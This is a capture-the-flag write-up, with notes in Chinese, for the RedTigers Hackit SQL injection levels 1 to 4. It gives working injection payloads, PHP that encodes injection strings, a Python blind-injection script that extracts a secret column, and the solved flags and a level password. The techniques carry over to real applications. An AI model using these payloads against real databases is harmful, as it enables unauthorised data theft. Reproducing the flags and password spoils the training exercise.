#SQL Practice@[RedTigers Hackit](http://redtiger.labs.overthewire.org)
##Level 1
1. 确定列数: Order by
2. Get: Union select
3. flag: 27cbddc803ecde822d87a7e8639f9315

##Level 2
1. ' or 1=1#
2. flag: 1222e2d4ad5da677efb188550528bfaa

##Level 3
	Target: Get the password of the user Admin.
	Hint: Try to get an error. Tablename: level3_users

1. 构造错误: level3.php?usr**[0]**=MTI5MTY0MTczMTY5MTc0
	Show userdetails:
	Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21

2. urlcrypt.inc
```
	function encrypt($str)
	{
		$cryptedstr = "";
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ 192;
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
	function decrypt ($str)
	{
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}
				foreach($array as $s)
				{
					$a = $s^192;
					$decStr .= chr($a);
				}
				return $decStr;
			}
			return false;
		}
		return false;
	}
```
得到两个函数，encrypt和decrypt分别用来解密和加密

3. 构造PHP语句，确定列数:
```
$url='http://redtiger.labs.overthewire.org/level3.php?usr=';
$order='admin\'order by 7 #';
$order=encrypt($order);
echo "$url$order <br>";
```
```
$url='http://redtiger.labs.overthewire.org/level3.php?usr=';
$order='admin\'order by 8 #';
$order=encrypt($order);
echo "$url$order <br>";
```

4. 构造PHP语句，拿到flag:
```
$url='http://redtiger.labs.overthewire.org/level3.php?usr=';
$order='\' union select 1,username,3,password,5,6,7 from level3_users where username=\'admin\' #';
$order=encrypt($order);
echo "$url$order <br>";
```

5. flag: a707b245a60d570d25a0449c2a516eca

##Level 4
	Target: Get the value of the first entry in table level4_secret in column keyword
	Disabled: like

1. 判断目标长度:
```
?id=1 and length(keyword)=17
```

2. 猜测目标内容：
```
?id=1 and ASCII(SUBSTR(keyword,1,1))=0
```

3. 自动化猜测：
```
import requests
def search(p,l,r):
    if l > r:
        return False
    x=(l+r) // 2
    re=s.post(url+order % (p,'=',x),data = login)
    if '1 rows.' in re.text:
        return chr(x)
    re=s.post(url+order % (p,'>',x),data = login)
    if '1 rows.' in re.text:
        return search(p,x+1,r)
    else:
        return search(p,l,x-1)
s = requests.Session()
login = {'password': 'dont_publish_solutions_GRR!',
         'level4login': 'Login'}
url='http://redtiger.labs.overthewire.org/level4.php'
order='?id=1 and length(keyword)>'
i=16
while i < 32767:
    re=s.post(url+order+str(i),data = login)
    if '0 rows.' in re.text:
        length=i
        break
    i=i+1
print 'length=',length
keyword=''
order='?id=1 and ASCII(SUBSTR(keyword,%d,1))%s%d'
for i in range(1,length+1):
    keyword=keyword+search(i,32,126)
    print i,'/',length,keyword
print 'keyword=',keyword
```

4. flag: e8bcb79c389f5e295bac81fda9fd7cfa

##Level 5
1. 










